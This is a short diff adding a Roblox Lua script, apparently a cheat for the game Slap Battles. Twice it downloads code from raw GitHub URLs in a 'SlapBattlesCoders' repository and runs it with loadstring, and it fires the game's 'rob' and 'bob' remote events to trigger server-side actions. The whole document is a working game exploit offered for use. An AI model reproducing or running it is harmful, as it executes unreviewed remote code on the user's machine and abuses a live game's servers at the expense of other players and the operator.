@@ -1,0 +1,7 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScripts2020/SlapBattlesCoders/refs/heads/main/bob/equip'))()
+wait()
+game.ReplicatedStorage.rob:FireServer()
+wait(2)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScripts2020/SlapBattlesCoders/refs/heads/main/bob/g4g'))()
+wait(2)
+game.ReplicatedStorage.bob:FireServer()
